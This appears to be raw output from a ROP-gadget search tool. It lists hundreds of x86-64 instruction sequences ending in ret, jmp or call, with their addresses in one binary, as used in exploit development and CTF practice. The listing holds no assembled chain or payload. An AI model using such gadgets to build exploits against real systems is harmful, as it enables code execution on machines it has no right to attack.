0x0000000000435ce9 : push rdi ; add al, 0x48 ; mov dword ptr [rdi], ecx ; ret
0x00000000004781d4 : push rdi ; add dword ptr [rax], eax ; add byte ptr [rax - 0x7d], cl ; ret
0x000000000044518c : push rdi ; add eax, 0xc478d48 ; ret
0x000000000045de2f : push rdi ; and byte ptr [rcx + 0x2b], cl ; push rdi ; sbb byte ptr [rax + 0x39], cl ; ret 0x850f
0x0000000000460eca : push rdi ; and eax, 0x48b4800 ; clc ; jmp rax
0x000000000042fae8 : push rdi ; clc ; ret
0x000000000042fc60 : push rdi ; cld ; ret
0x0000000000430787 : push rdi ; cli ; mov dword ptr [rdi - 4], ecx ; ret
0x00000000004355c9 : push rdi ; cmc ; mov dword ptr [rdi - 4], ecx ; ret
0x000000000046fe85 : push rdi ; cmp byte ptr [rax - 0x7d], cl ; clc ; dec dword ptr [rax - 0x77] ; ret 0xf41
0x0000000000435549 : push rdi ; hlt ; mov dword ptr [rdi - 4], ecx ; ret
0x000000000043539a : push rdi ; int1 ; mov qword ptr [rdi - 8], rcx ; ret
0x0000000000410c45 : push rdi ; mov ebp, dword ptr [rdx] ; add byte ptr [rax - 0x77], cl ; ret
0x0000000000416dd4 : push rdi ; mov qword ptr [rdi + 8], rax ; ret
0x000000000043542a : push rdi ; mov qword ptr [rdi - 8], rcx ; ret
0x000000000040401e : push rdi ; or al, 0xf ; retf 0xd289
0x00000000004845aa : push rdi ; or byte ptr [rcx + 0x29], cl ; ret 0x894c
0x00000000004883aa : push rdi ; or byte ptr [rcx + 1], cl ; ret 0x894c
0x00000000004845b1 : push rdi ; or byte ptr [rcx - 0x2feeb728], cl ; pop rbp ; pop rbx ; ret
0x0000000000404013 : push rdi ; or byte ptr [rdi], cl ; retf 0x8941
0x000000000041b316 : push rdi ; or dh, dh ; ret 0xf02
0x0000000000445370 : push rdi ; or eax, 0x1c478d48 ; ret
0x0000000000423f45 : push rdi ; ret
0x000000000042df7e : push rdi ; ret 0xff3
0x000000000042daa3 : push rdi ; retf
0x000000000042db23 : push rdi ; retf 0xcab2
0x0000000000419a80 : push rdi ; sbb byte ptr [rax + 0x39], cl ; ret
0x000000000045de33 : push rdi ; sbb byte ptr [rax + 0x39], cl ; ret 0x850f
0x0000000000404052 : push rdi ; sbb byte ptr [rdi], cl ; retf 0xd289
0x0000000000430987 : push rdi ; stc ; mov dword ptr [rdi - 4], ecx ; ret
0x00000000004b5461 : push rdi ; std ; call qword ptr [rdx]
0x00000000004301aa : push rdi ; std ; mov word ptr [rdi - 2], cx ; ret
0x0000000000430587 : push rdi ; sti ; mov dword ptr [rdi - 4], ecx ; ret
0x000000000047345b : push rdi ; xor byte ptr [rsi + 0xf], ah ; outsd dx, dword ptr [rsi] ; ret
0x000000000042bc98 : push rdi ; xor eax, eax ; ret
0x00000000004b0c15 : push rdx ; add byte ptr [rax], al ; psubw mm6, mm4 ; jmp qword ptr [rbx]
0x0000000000494dd0 : push rdx ; cli ; jmp rdx
0x00000000004250da : push rdx ; insb byte ptr [rdi], dx ; add byte ptr [rax], al ; cmove rax, rdx ; ret
0x0000000000494ae4 : push rdx ; or al, 0xfa ; call rdx
0x0000000000494aec : push rdx ; or edi, edx ; call rdx
0x000000000045137d : push rdx ; sbb ecx, dword ptr [rcx + 0x50895048] ; push rsp ; ret
0x0000000000494364 : push rdx ; xchg eax, esp ; stc ; jmp qword ptr [rdx]
0x0000000000494874 : push rsi ; adc al, 0xfa ; jmp rsi
0x000000000042cbc4 : push rsi ; adc byte ptr [rsi + 0xf], ah ; cmp byte ptr [rdi], dl ; ret 0x830f
0x00000000004476c9 : push rsi ; add ah, byte ptr [rdx - 0xf] ; jl 0x447720 ; adc dword ptr [rsi + 3], edx ; ret
0x00000000004b0fd9 : push rsi ; add byte ptr [rax], al ; add al, 9 ; cli ; jmp qword ptr [rdx]
0x0000000000435f81 : push rsi ; add cl, byte ptr [rbx + 0x257890e] ; mov dword ptr [rdi], ecx ; ret
0x0000000000435ff1 : push rsi ; add dword ptr [rbx + 0x157890e], ecx ; mov dword ptr [rdi], ecx ; ret
0x0000000000444b25 : push rsi ; add eax, 0x480f8948 ; mov dword ptr [rdi + 5], edx ; ret
0x0000000000435f11 : push rsi ; add ecx, dword ptr [rbx + 0x357890e] ; mov dword ptr [rdi], ecx ; ret
0x0000000000444ac3 : push rsi ; add ecx, dword ptr [rcx + 0x357890f] ; ret
0x000000000042cbd9 : push rsi ; and byte ptr [rsi + 0xf], ah ; cmp byte ptr [rdi], dl ; ret 0x830f
0x000000000042fc12 : push rsi ; clc ; mov qword ptr [rdi - 8], rdx ; ret
0x0000000000430381 : push rsi ; cld ; mov dword ptr [rdi - 4], edx ; ret
0x000000000042ffb5 : push rsi ; cld ; mov qword ptr [rdi - 0xa], rcx ; mov dword ptr [rdi - 4], edx ; ret
0x0000000000430195 : push rsi ; cld ; mov qword ptr [rdi - 0xb], rcx ; mov dword ptr [rdi - 4], edx ; ret
0x0000000000430375 : push rsi ; cld ; mov qword ptr [rdi - 0xc], rcx ; mov dword ptr [rdi - 4], edx ; ret
0x000000000042fdd5 : push rsi ; cld ; mov qword ptr [rdi - 9], rcx ; mov dword ptr [rdi - 4], edx ; ret
0x00000000004a9560 : push rsi ; cli ; push 0x6e ; ja 0x4a94ef ; ret 0x48f
0x0000000000446976 : push rsi ; cmc ; sub eax, edx ; ret
0x0000000000458e9e : push rsi ; cmp byte ptr [rax - 0x3f], cl ; retf 0x6411
0x0000000000494d53 : push rsi ; cmp eax, 0x3d86fffa ; cli ; call qword ptr [rsi]
0x0000000000494d6c : push rsi ; cmp edi, edx ; jmp rsi
0x0000000000446966 : push rsi ; hlt ; sub eax, edx ; ret
0x0000000000446936 : push rsi ; int1 ; sub eax, edx ; ret
0x000000000044c8e6 : push rsi ; jmp qword ptr [rsi]
0x00000000004a89c0 : push rsi ; pop rdx ; je 0x4a898c ; ret 0xacfc
0x0000000000450366 : push rsi ; ret
0x00000000004096d6 : push rsi ; retf 0xffff
0x0000000000469371 : push rsi ; sbb byte ptr [rax - 0x3f], cl ; cli ; add cl, byte ptr [rax + 0x39] ; ret 0x850f
0x0000000000495b07 : push rsi ; sti ; inc dword ptr [rax] ; sti ; jmp qword ptr [rcx]
0x00000000004959db : push rsi ; sti ; jmp rsp
0x0000000000458bca : push rsi ; sub byte ptr [rax - 0x3f], cl ; retf
0x000000000045e243 : push rsi ; sub dh, al ; add byte ptr [rcx - 0x7d], cl ; ret
0x000000000040392c : push rsi ; sub eax, dword ptr [rax] ; add byte ptr [rax - 0x77], cl ; ret
0x0000000000446946 : push rsi ; sub eax, edx ; ret
0x00000000004a6f88 : push rsi ; xchg eax, ebp ; jge 0x4a6f6d ; push r8 ; xor byte ptr [rcx], ah ; retf
0x000000000042cbee : push rsi ; xor byte ptr [rsi + 0xf], ah ; cmp byte ptr [rdi], dl ; ret 0x830f
0x00000000004ab4db : push rsp ; adc dh, bh ; call rsp
0x0000000000475981 : push rsp ; add byte ptr [rax], al ; mov eax, ecx ; syscall
0x000000000048270a : push rsp ; and al, 0x10 ; call rdx
0x000000000041d368 : push rsp ; and al, 0x10 ; mov qword ptr [rsp + 8], rax ; call rcx
0x000000000041d8c5 : push rsp ; and al, 8 ; call 0x419b65
0x0000000000403e13 : push rsp ; and al, 8 ; call 0x420105
0x00000000004b173c : push rsp ; jns 0x4b173c ; jmp rax
0x000000000044ea94 : push rsp ; mov bh, 0x26 ; add byte ptr [rsi + rbp*4 - 0x18], dh ; xchg eax, ecx ; retf 0
0x00000000004add0c : push rsp ; mov bl, 0xf6 ; call qword ptr [rdi]
0x00000000004b09b0 : push rsp ; push rax ; add byte ptr [rax], al ; mov ebx, ss ; stc ; jmp qword ptr [rdx]
0x0000000000451384 : push rsp ; ret
0x000000000048918c : push rsp ; ret 0x4808
0x000000000048f808 : push rsp ; retf
0x000000000041fdb3 : push rsp ; retf 0x29
0x0000000000482b85 : push rsp ; retf 0x48f8
0x0000000000403f67 : push rsp ; sbb eax, 0xfc80f00 ; retf 0xc089
0x00000000004942c9 : push rsp ; stc ; call rax
0x00000000004959a4 : push rsp ; sti ; jmp qword ptr [rcx]
0x00000000004a918a : push rsp ; syscall
0x00000000004b22ec : push rsp ; xchg eax, edx ; sti ; jmp qword ptr [rax]
0x0000000000495094 : push rsp ; xor al, 0xfa ; call rsp
0x00000000004950a4 : push rsp ; xor bh, dl ; call rsp
0x000000000049509c : push rsp ; xor edi, edx ; call rsp
0x00000000004950ac : push rsp ; xor edx, edi ; call rsp
0x000000000043dd70 : pushfq ; adc eax, 0x83480000 ; ret 0xe910
0x00000000004625de : pushfq ; add byte ptr [rax], al ; add byte ptr [rcx + 0x63], cl ; ret 0x8944
0x000000000044bc27 : pushfq ; add byte ptr [rax], al ; add byte ptr [rcx - 0x75], cl ; jge 0x44bc38 ; call r12
0x0000000000452a2a : pushfq ; and al, 0xa0 ; add byte ptr [rax], al ; add dh, dh ; ret 0x4801
0x0000000000479e0f : pushfq ; and al, 0xc0 ; add byte ptr [rax], al ; add byte ptr [rcx - 0x77], cl ; ret 0x848b
0x00000000004174fb : pushfq ; and al, 0xd8 ; add byte ptr [rax], al ; add byte ptr [rax - 0x39], cl ; ret 0xac20
0x00000000004af839 : pushfq ; clc ; call qword ptr [rax]
0x00000000004af84d : pushfq ; clc ; jmp qword ptr [rsi]
0x000000000043ea70 : pushfq ; or byte ptr [rax], al ; add byte ptr [rax - 0x7d], cl ; ret 0xe910
0x000000000042ac44 : pushfq ; or eax, 0x83480000 ; ret 0xeb10
0x0000000000410410 : pushfq ; ret
0x000000000048c897 : pushfq ; ret 0xf45
0x00000000004943b9 : pushfq ; stc ; call qword ptr [rcx]
0x00000000004b0e1c : rcl byte ptr [rax + rax], 0xa0 ; clc ; std ; jmp qword ptr [rdx]
0x0000000000494218 : rcl byte ptr [rdi], 1 ; stc ; call qword ptr [rax]
0x00000000004a92d1 : rcl byte ptr [rdi], cl ; retf
0x0000000000494208 : rcl byte ptr [rdx], 1 ; stc ; call qword ptr [rax]
0x0000000000494828 : rcl byte ptr [rip + 0x1550fffa], 0xfa ; jmp rax
0x00000000004632ec : rcl cl, 1 ; stc ; dec dword ptr [rax + 0x29] ; ret
0x00000000004241eb : rcl dword ptr [rax], 1 ; add byte ptr [rax + 0xf], cl ; ret 0xc3f3
0x00000000004a8dfa : rcl dword ptr [rsi + 0x27], cl ; retf 0xc0fe
0x00000000004a89bf : rcl dword ptr [rsi + 0x5a], cl ; je 0x4a898d ; ret 0xacfc
0x00000000004a8df9 : rcl qword ptr [r14 + 0x27], cl ; retf 0xc0fe
0x00000000004a89bb : rcpps xmm2, xmmword ptr [rdx + 0x5a56d373] ; je 0x4a8991 ; ret 0xacfc
0x00000000004947b4 : rcr al, 1 ; stc ; jmp qword ptr [rax]
0x0000000000494460 : rcr byte ptr [rax - 0x66bf0007], 0xf9 ; call rax
0x0000000000473243 : rcr byte ptr [rbp + 0x41], 0x5c ; pop r13 ; pop r14 ; ret
0x0000000000405eb0 : rcr byte ptr [rbp + 0x41], 0x5c ; ret
0x0000000000410ef1 : rcr byte ptr [rbp + 0x41], 1 ; pop rsp ; pop r13 ; ret
0x000000000046603f : rcr byte ptr [rbp + 0x41], 1 ; pop rsp ; ret
0x00000000004845b7 : rcr byte ptr [rbp + 0x5b], 1 ; ret
0x0000000000450372 : rcr byte ptr [rbx + 0x5d], 0x41 ; pop rsp ; pop r13 ; pop r14 ; ret
0x00000000004150ac : rcr byte ptr [rbx + 0x5d], 0x41 ; pop rsp ; pop r13 ; ret
0x000000000040ed96 : rcr byte ptr [rbx + 0x5d], 0x41 ; pop rsp ; ret
0x000000000048d4c8 : rcr byte ptr [rbx + 0x5d], 0xc3 ; nop dword ptr [rax] ; ret
0x0000000000410f9a : rcr byte ptr [rbx + 0x5d], 1 ; pop r12 ; pop r13 ; ret
0x0000000000410932 : rcr byte ptr [rbx + 0x5d], 1 ; ret
0x0000000000494228 : rcr byte ptr [rcx + rdi*8], 1 ; call qword ptr [rax]
0x00000000004a8ddd : rcr byte ptr [rdi + 0x6d], cl ; test eax, 0x7d4c8c5d ; ret 0xd8f
0x00000000004943b4 : rcr dword ptr [rbx - 0x638e0007], 1 ; stc ; call qword ptr [rcx]
0x0000000000482869 : rcr dword ptr [rcx], 0xc0 ; and eax, 2 ; sub eax, 1 ; ret
0x00000000004a9131 : rcr dword ptr [rcx], cl ; retf 0xbb9a
0x0000000000447804 : rep movsb byte ptr [rdi], byte ptr [rsi] ; cld ; ret
0x00000000004477f6 : rep movsb byte ptr [rdi], byte ptr [rsi] ; ret
0x000000000044852a : rep stosb byte ptr [rdi], al ; mov rax, rdx ; ret
0x000000000041f5f1 : rep stosq qword ptr [rdi], rax ; pop rbx ; ret
0x000000000040058b : repe cmpsb byte ptr [rsi], byte ptr [rdi] ; jne 0x400596 ; ret
0x0000000000400416 : ret
0x00000000004006b7 : ret 0
0x000000000049f5c0 : ret 0x10
0x000000000047b6fa : ret 0x101
0x000000000048458c : ret 0x114d
0x00000000004583d4 : ret 0x1176
0x000000000047fc6c : ret 0x1272
0x000000000047c803 : ret 0x13e9
0x000000000048ad31 : ret 0x145
0x0000000000483a36 : ret 0x1474
0x0000000000479298 : ret 0x1475
0x0000000000475a31 : ret 0x1477
0x00000000004468d8 : ret 0x148
0x00000000004048a4 : ret 0x149
0x000000000043939c : ret 0x14d
0x000000000040a1fa : ret 0x167
0x000000000046c2c1 : ret 0x1674
0x0000000000409efa : ret 0x16a
0x0000000000449d6e : ret 0x16e9
0x0000000000427aca : ret 0x17
0x000000000042c176 : ret 0x1776
0x000000000040ab92 : ret 0x18
0x00000000004392d9 : ret 0x180f
0x000000000042bd05 : ret 0x1876
0x000000000047ce1a : ret 0x18e8
0x00000000004071fa : ret 0x197
0x0000000000406afa : ret 0x19e
0x00000000004068fa : ret 0x1a0
0x00000000004583cb : ret 0x1a72
0x00000000004a933a : ret 0x1ad4
0x0000000000407d52 : ret 0x1b
0x00000000004a7acd : ret 0x1b49
0x000000000048edff : ret 0x1be8
0x0000000000424f9a : ret 0x1c6
0x000000000040f159 : ret 0x1ce9
0x00000000004a1290 : ret 0x1d4
0x00000000004a1a28 : ret 0x1d5
0x0000000000400ce1 : ret 0x1d89
0x000000000040ec52 : ret 0x1f0f
0x000000000041f316 : ret 0x1f77
0x000000000045a7bd : ret 0x1fe9
0x000000000045b417 : ret 0x200
0x0000000000477e1b : ret 0x2041
0x000000000044a82c : ret 0x2044
0x0000000000461cf7 : ret 0x20be
0x000000000048ac9b : ret 0x2148
0x000000000041417d : ret 0x214c
0x000000000041370c : ret 0x2175
0x00000000004906c4 : ret 0x22
0x000000000047ea08 : ret 0x2275
0x0000000000441648 : ret 0x2288
0x00000000004250aa : ret 0x22a
0x000000000048659a : ret 0x233c
0x000000000042e0e2 : ret 0x2373
0x00000000004a0298 : ret 0x24
0x00000000004168bd : ret 0x2501
0x00000000004673c4 : ret 0x2504
0x0000000000423fc3 : ret 0x2575
0x000000000048c731 : ret 0x25e9
0x000000000044fb88 : ret 0x26
0x00000000004583aa : ret 0x263a
0x000000000044d65a : ret 0x26b3
0x0000000000473936 : ret 0x2774
0x000000000042f8b6 : ret 0x280f
0x000000000042bcf5 : ret 0x2876
0x000000000047ea87 : ret 0x28f5
0x000000000041d60d : ret 0x29
0x000000000046351e : ret 0x290f
0x000000000040f589 : ret 0x2948
0x000000000046645a : ret 0x2949
0x000000000040f950 : ret 0x294c
0x00000000004139ed : ret 0x294d
0x000000000042502a : ret 0x296d
0x0000000000422dfa : ret 0x298
0x000000000041ffba : ret 0x29bd
0x000000000041055c : ret 0x2a
0x00000000004112aa : ret 0x2b48
0x0000000000403199 : ret 0x2b5d
0x00000000004236eb : ret 0x2b74
0x000000000041f632 : ret 0x2b75
0x00000000004489a2 : ret 0x2b77
0x00000000004009a5 : ret 0x2b8
0x000000000048c71f : ret 0x2be9
0x000000000041fe7e : ret 0x2c75
0x0000000000477aa2 : ret 0x2cc
0x000000000046f255 : ret 0x2e66
0x000000000044ca9e : ret 0x2f75
0x0000000000467f85 : ret 0x30be
0x00000000004a0788 : ret 0x33
0x0000000000453234 : ret 0x349
0x000000000048aad0 : ret 0x3575
0x000000000047b3ca : ret 0x3774
0x000000000042c156 : ret 0x3776
0x00000000004a8c1a : ret 0x3827
0x00000000004700de : ret 0x3873
0x000000000042bce5 : ret 0x3876
0x000000000041736b : ret 0x389
0x00000000004a72a6 : ret 0x38ae
0x000000000048e3e2 : ret 0x38e8
0x00000000004896a8 : ret 0x3901
0x000000000048118d : ret 0x3934
0x000000000046d898 : ret 0x3941
0x0000000000411b51 : ret 0x3948
0x000000000041290d : ret 0x3949
0x000000000041f75c : ret 0x394c
0x0000000000468f2d : ret 0x394d
0x0000000000446f52 : ret 0x3a01
0x000000000042e0cb : ret 0x3a73
0x00000000004881f3 : ret 0x3a83
0x000000000048121a : ret 0x3b34
0x0000000000447971 : ret 0x3b48
0x000000000044a50f : ret 0x3b8
0x0000000000414969 : ret 0x3c75
0x000000000048114d : ret 0x3d
0x000000000047f3f8 : ret 0x3d73
0x0000000000420f31 : ret 0x3d83
0x0000000000464c1d : ret 0x3de8
0x000000000041d28f : ret 0x3de9
0x0000000000463547 : ret 0x3e8
0x000000000047b22a : ret 0x3e80
0x000000000045abcb : ret 0x4002
0x000000000040d31d : ret 0x4074
0x0000000000473f21 : ret 0x408d
0x000000000044ccea : ret 0x4101
0x00000000004605c8 : ret 0x4108
0x0000000000460d75 : ret 0x4110
0x00000000004811c7 : ret 0x4134
0x00000000004539e7 : ret 0x415f
0x00000000004555b5 : ret 0x419
0x000000000045144e : ret 0x41c3
0x000000000042674a : ret 0x4266
0x0000000000470bb3 : ret 0x4389
0x0000000000405e81 : ret 0x4401
0x00000000004687db : ret 0x4404
0x000000000041ac6b : ret 0x4466
0x000000000041e603 : ret 0x4473
0x00000000004a7da4 : ret 0x474c
0x0000000000424766 : ret 0x4801
0x0000000000412b06 : ret 0x4803
0x0000000000422fd1 : ret 0x4804
0x00000000004415d3 : ret 0x4808
0x0000000000403056 : ret 0x480a
0x000000000041cca8 : ret 0x4810
0x000000000045917c : ret 0x4811
0x000000000045dcc7 : ret 0x481e
0x000000000045dce7 : ret 0x4820
0x000000000044ec6e : ret 0x4830
0x0000000000426656 : ret 0x4840
0x0000000000441288 : ret 0x48c3
0x0000000000419683 : ret 0x48e9
0x00000000004a9566 : ret 0x48f
0x0000000000405e1c : ret 0x4901
0x0000000000455e8b : ret 0x4902
0x0000000000419cc2 : ret 0x4908
0x000000000042ac1c : ret 0x4910
0x000000000045b019 : ret 0x4c01
0x000000000041efaa : ret 0x4c07
0x000000000045d586 : ret 0x4c40
0x000000000041dc66 : ret 0x4d01
0x000000000045c838 : ret 0x4d10
0x000000000040275f : ret 0x4de8
0x00000000004a8fc7 : ret 0x4e27
0x000000000040178e : ret 0x4f76
0x000000000044f7ef : ret 0x5089
0x000000000044c907 : ret 0x508b
0x000000000042e0b4 : ret 0x5173
0x000000000044a767 : ret 0x5488
0x00000000004a722c : ret 0x5508
0x0000000000471c7e : ret 0x5590
0x000000000042c136 : ret 0x5776
0x00000000004a94f8 : ret 0x5803
0x0000000000455ef1 : ret 0x5841
0x0000000000487b65 : ret 0x5876
0x000000000040e793 : ret 0x589
0x00000000004a6f00 : ret 0x591c
0x00000000004a7c67 : ret 0x5ae4
0x0000000000424c8e : ret 0x5ae9
0x00000000004560d9 : ret 0x5be9
0x000000000040f56e : ret 0x5d5b
0x0000000000424555 : ret 0x5e8
0x00000000004a9992 : ret 0x62c1
0x0000000000480ed0 : ret 0x62e8
0x000000000047c670 : ret 0x6349
0x0000000000485384 : ret 0x637f
0x0000000000459153 : ret 0x6411
0x000000000045bd31 : ret 0x6601
0x000000000042bc71 : ret 0x6620
0x0000000000424138 : ret 0x66c3
0x000000000047fc7e : ret 0x674
0x000000000042c126 : ret 0x6776
0x00000000004a6f1f : ret 0x67b2
0x0000000000417915 : ret 0x6874
0x0000000000449e1a : ret 0x6ae9
0x00000000004a9b21 : ret 0x6f9
0x0000000000417a91 : ret 0x7401
0x0000000000422f9a : ret 0x7402
0x000000000047c6da : ret 0x7403
0x000000000044ae91 : ret 0x7404
0x0000000000471a52 : ret 0x7408
0x000000000041321d : ret 0x7420
0x0000000000464474 : ret 0x7450
0x0000000000480e8a : ret 0x7472
0x00000000004454b9 : ret 0x7501
0x00000000004454c6 : ret 0x7502
0x00000000004454d3 : ret 0x7504
0x000000000041f2bd : ret 0x7508
0x000000000044548b : ret 0x7510
0x0000000000445498 : ret 0x7520
0x0000000000424fbe : ret 0x7540
0x000000000041e8da : ret 0x757
0x0000000000475990 : ret 0x7577
0x000000000042cfa2 : ret 0x7677
0x0000000000482b22 : ret 0x777
0x00000000004843e6 : ret 0x77f
0x0000000000402eb1 : ret 0x7ce9
0x000000000042bc11 : ret 0x7e20
0x000000000042c08c : ret 0x7e40
0x00000000004252fc : ret 0x7f10
0x000000000046dab0 : ret 0x7f3c
0x000000000043387e : ret 0x80
0x00000000004264d9 : ret 0x8000
0x000000000048e0a2 : ret 0x8001
0x0000000000476dd7 : ret 0x8116
0x000000000045fd9b : ret 0x8148
0x000000000048e5f8 : ret 0x8166
0x000000000041d990 : ret 0x820f
0x0000000000455713 : ret 0x8301
0x000000000047d3f7 : ret 0x8303
0x000000000042cb70 : ret 0x830f
0x000000000045db94 : ret 0x8341
0x0000000000424075 : ret 0x8348
0x00000000004473d0 : ret 0x8349
0x000000000047f26f : ret 0x8364
0x0000000000471396 : ret 0x840
0x0000000000475d89 : ret 0x8401
0x0000000000412915 : ret 0x840f
0x0000000000454460 : ret 0x841
0x000000000048b34e : ret 0x8440
0x0000000000479e17 : ret 0x848b
0x000000000046eef9 : ret 0x8502
0x0000000000413aa2 : ret 0x850f
0x0000000000458ab3 : ret 0x8511
0x000000000044b1c2 : ret 0x8545
0x0000000000402c32 : ret 0x8548
0x0000000000423fea : ret 0x854d
0x0000000000405cf1 : ret 0x8575
0x00000000004014c2 : ret 0x860f
0x000000000041b64f : ret 0x870f
0x00000000004a683e : ret 0x871e
0x000000000046dab7 : ret 0x875
0x000000000042bd15 : ret 0x876
0x0000000000402d5c : ret 0x8801
0x000000000045275d : ret 0x8804
0x000000000045bd82 : ret 0x8841
0x000000000047e35e : ret 0x8844
0x000000000045b2aa : ret 0x88e8
0x000000000041c86f : ret 0x88f
0x000000000040254a : ret 0x8901
0x000000000044d79e : ret 0x8902
0x0000000000412d9a : ret 0x8908
0x000000000045db86 : ret 0x8941
0x000000000041ff1f : ret 0x8944
0x0000000000403f0f : ret 0x8948
0x0000000000413fca : ret 0x8949
0x00000000004115c1 : ret 0x894c
0x000000000048359b : ret 0x894e
0x0000000000417efa : ret 0x8a
0x0000000000487d90 : ret 0x8b
0x0000000000451089 : ret 0x8b01
0x000000000046f54a : ret 0x8b04
0x0000000000475b23 : ret 0x8b05
0x000000000046f3fb : ret 0x8b08
0x00000000004a906e : ret 0x8b36
0x000000000041de71 : ret 0x8b41
0x000000000046db53 : ret 0x8b44
0x00000000004143f3 : ret 0x8b48
0x0000000000411d76 : ret 0x8b49
0x000000000048351e : ret 0x8b4a
0x000000000040d52d : ret 0x8b4c
0x0000000000464cdd : ret 0x8c0f
0x000000000045d5e1 : ret 0x8d04
0x000000000048c54f : ret 0x8d0f
0x000000000041d56c : ret 0x8d44
0x000000000041a161 : ret 0x8d48
0x00000000004681bc : ret 0x8d49
0x00000000004828c7 : ret 0x8d4a
0x000000000041e684 : ret 0x8d4c
0x000000000045dba2 : ret 0x8d89
0x000000000045322b : ret 0x8e0f
0x000000000045de4a : ret 0x8f0f
0x0000000000440a55 : ret 0x90c3
0x0000000000424709 : ret 0x90e9
0x0000000000477ede : ret 0x9174
0x000000000048b18b : ret 0x9272
0x000000000041b96d : ret 0x948
0x00000000004734f8 : ret 0x94c
0x0000000000484db2 : ret 0x950f
0x0000000000449770 : ret 0x9572
0x00000000004a7e93 : ret 0x9576
0x000000000046079f : ret 0x958b
0x0000000000422f2e : ret 0x976
0x000000000047d1a3 : ret 0x9be9
0x0000000000487275 : ret 0x9eb
0x000000000049edc0 : ret 0xa
0x00000000004aecce : ret 0xa01
0x000000000044aeb8 : ret 0xa076
0x0000000000449ce4 : ret 0xa0e9
0x000000000048c60e : ret 0xa4e9
0x00000000004a7b83 : ret 0xa514
0x000000000048c70d : ret 0xa5e9
0x000000000044be5d : ret 0xabe
0x00000000004105f6 : ret 0xac20
0x00000000004a8007 : ret 0xac65
0x000000000046629e : ret 0xace8
0x00000000004a89c4 : ret 0xacfc
0x000000000045f5df : ret 0xae9
0x0000000000423e2a : ret 0xaeeb
0x00000000004ac237 : ret 0xb00e
0x00000000004121dd : ret 0xb074
0x000000000041b9cb : ret 0xb277
0x00000000004652ae : ret 0xb2c8
0x0000000000456cbb : ret 0xb2eb
0x0000000000449cd0 : ret 0xb4e9
0x000000000045dbc6 : ret 0xb589
0x000000000048a085 : ret 0xb5e8
0x0000000000402d15 : ret 0xb60f
0x0000000000400fd4 : ret 0xb70f
0x0000000000485e3a : ret 0xb7a1
0x0000000000469e25 : ret 0xb8
0x000000000046bbcc : ret 0xb848
0x000000000048e462 : ret 0xb8e8
0x00000000004a7ece : ret 0xb9b9
0x000000000046d405 : ret 0xb9e9
0x000000000046efd4 : ret 0xba41
0x0000000000423663 : ret 0xbae9
0x0000000000456df2 : ret 0xbaeb
0x000000000048cbc6 : ret 0xbc80
0x000000000045dbb2 : ret 0xbd89
0x0000000000480fd2 : ret 0xbe0f
0x00000000004a7c24 : ret 0xbe57
0x0000000000426399 : ret 0xc000
0x0000000000403246 : ret 0xc031
0x000000000045919e : ret 0xc083
0x000000000042bad0 : ret 0xc085
0x0000000000474559 : ret 0xc148
0x000000000041bae9 : ret 0xc183
0x00000000004049d8 : ret 0xc189
0x000000000044ab52 : ret 0xc221
0x000000000041ff5b : ret 0xc275
0x0000000000476936 : ret 0xc283
0x000000000042df84 : ret 0xc2b2
0x0000000000448a0e : ret 0xc35b
0x000000000045858d : ret 0xc389
0x000000000041ff5d : ret 0xc3f3
0x00000000004a63c2 : ret 0xc4c3
0x00000000004a77d8 : ret 0xc4ff
0x000000000042c0f1 : ret 0xc540
0x0000000000458656 : ret 0xc589
0x000000000046347c : ret 0xc689
0x000000000047f24d : ret 0xc74
0x0000000000441990 : ret 0xc748
0x0000000000469078 : ret 0xc789
0x0000000000481062 : ret 0xc829
0x0000000000461e43 : ret 0xc839
0x000000000041735c : ret 0xc883
0x0000000000460877 : ret 0xc985
0x000000000046f4e3 : ret 0xc9eb
0x00000000004415a1 : ret 0xc9ff
0x00000000004008c1 : ret 0xca21
0x000000000047841f : ret 0xcbe9
0x00000000004a726a : ret 0xcca7
0x00000000004a934d : ret 0xcd11
0x00000000004051e2 : ret 0xce80
0x000000000049f1c0 : ret 0xd
0x00000000004217de : ret 0xd020
0x000000000040dfd6 : ret 0xd021
0x000000000044c2df : ret 0xd029
0x00000000004642fb : ret 0xd120
0x00000000004012f4 : ret 0xd284
0x000000000045814a : ret 0xd285
0x000000000048eb48 : ret 0xd2e8
0x0000000000479ea6 : ret 0xd348
0x0000000000450167 : ret 0xd5e9
0x000000000048140f : ret 0xd75
0x000000000040f386 : ret 0xd774
0x00000000004a8de5 : ret 0xd8f
0x000000000046de49 : ret 0xd9e8
0x00000000004108e3 : ret 0xdaf7
0x000000000045493a : ret 0xdb76
0x00000000004a8ec6 : ret 0xdcd9
0x00000000004a7e42 : ret 0xde5d
0x0000000000480e95 : ret 0xde8
0x00000000004a6bd1 : ret 0xde9e
0x0000000000426259 : ret 0xe000
0x0000000000445449 : ret 0xe074
0x000000000044def0 : ret 0xe083
0x00000000004b544c : ret 0xe0a
0x000000000048c7d1 : ret 0xe1e9
0x000000000044dd22 : ret 0xe1eb
0x000000000040dbc0 : ret 0xe281
0x0000000000400d15 : ret 0xe283
0x0000000000473208 : ret 0xe575
0x0000000000465900 : ret 0xe57f
0x000000000046627a : ret 0xe583
0x0000000000448a02 : ret 0xe680
0x000000000046695f : ret 0xe683
0x00000000004a8fe6 : ret 0xe71f
0x000000000047926a : ret 0xe75
0x0000000000423716 : ret 0xe775
0x0000000000465f33 : ret 0xe7e9
0x000000000042c755 : ret 0xe883
0x0000000000478de6 : ret 0xe8c0
0x0000000000402fea : ret 0xe901
0x000000000040302f : ret 0xe902
0x0000000000441636 : ret 0xe908
0x000000000043dbd6 : ret 0xe910
0x000000000045e40d : ret 0xe920
0x00000000004a7347 : ret 0xe970
0x000000000044899a : ret 0xea81
0x000000000040dc8d : ret 0xeab8
0x0000000000400cfd : ret 0xeac1
0x000000000047daa6 : ret 0xeb01
0x000000000046f413 : ret 0xeb04
0x000000000042ac4a : ret 0xeb10
0x0000000000481232 : ret 0xeb34
0x0000000000411cfa : ret 0xec
0x00000000004a9af8 : ret 0xec2
0x000000000040f310 : ret 0xed75
0x00000000004a979a : ret 0xef32
0x000000000048c398 : ret 0xef89
0x0000000000475f6f : ret 0xefeb
0x0000000000429a3e : ret 0xf
0x0000000000426119 : ret 0xf000
0x00000000004056c5 : ret 0xf01
0x000000000041b319 : ret 0xf02
0x000000000041d6f9 : ret 0xf04
0x0000000000412463 : ret 0xf08
0x000000000041b5e9 : ret 0xf0f
0x000000000040e4de : ret 0xf10
0x000000000046677b : ret 0xf20
0x000000000041d863 : ret 0xf275
0x0000000000463836 : ret 0xf3f
0x0000000000466d03 : ret 0xf40
0x000000000046fe8d : ret 0xf41
0x000000000048c84c : ret 0xf45
0x0000000000424309 : ret 0xf475
0x0000000000451fe6 : ret 0xf48
0x00000000004004fd : ret 0xf49
